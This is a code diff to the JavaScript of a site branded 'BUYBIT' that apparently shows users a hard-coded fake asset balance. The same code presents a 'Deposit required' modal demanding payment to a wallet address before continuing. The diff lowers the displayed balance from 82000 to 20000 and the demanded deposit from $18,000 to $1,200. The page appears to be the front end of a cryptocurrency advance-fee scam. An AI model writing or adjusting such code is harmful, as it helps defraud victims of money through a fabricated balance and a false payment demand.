@@ -8,7 +8,7 @@ const PAID_KEY = 'buybit-hasPaid';
 
 const liveValues = document.querySelectorAll('.live-number');
 const assetAmount = document.querySelector('.asset-number');
-let baseAsset = 82000;
+let baseAsset = 20000;
 
 function formatNumber(value, isInt = false) {
   if (isInt) {
@@ -316,7 +316,7 @@ function showDepositModal(destination) {
 
   modal.innerHTML = `
     <h3>Deposit required</h3>
-    <p>Please deposit <strong>$18,000.00 USD</strong> to the BUYBIT settlement address to continue. Once you have completed the payment, check the box below and click "Confirm Payment".</p>
+    <p>Please deposit <strong>$1,200.00 USD</strong> to the BUYBIT settlement address to continue. Once you have completed the payment, check the box below and click "Confirm Payment".</p>
     <div style="margin:8px 0">
       <div style="font-size:0.95rem;color:var(--text);margin-bottom:6px">Wallet address</div>
       <div style="display:flex;gap:8px;align-items:center">
@@ -324,7 +324,7 @@ function showDepositModal(destination) {
         <button id="deposit-copy-btn" class="btn btn-outline" style="white-space:nowrap">Copy</button>
       </div>
     </div>
-    <label class="deposit-checkbox"><input type="checkbox" id="deposit-confirm-checkbox" /> I have paid $18,000.00</label>
+    <label class="deposit-checkbox"><input type="checkbox" id="deposit-confirm-checkbox" /> I have paid $1,200.00</label>
     <div class="deposit-actions">
       <button id="deposit-cancel" class="btn btn-secondary">Cancel</button>
       <button id="deposit-confirm" class="btn btn-primary" disabled>Confirm Payment</button>
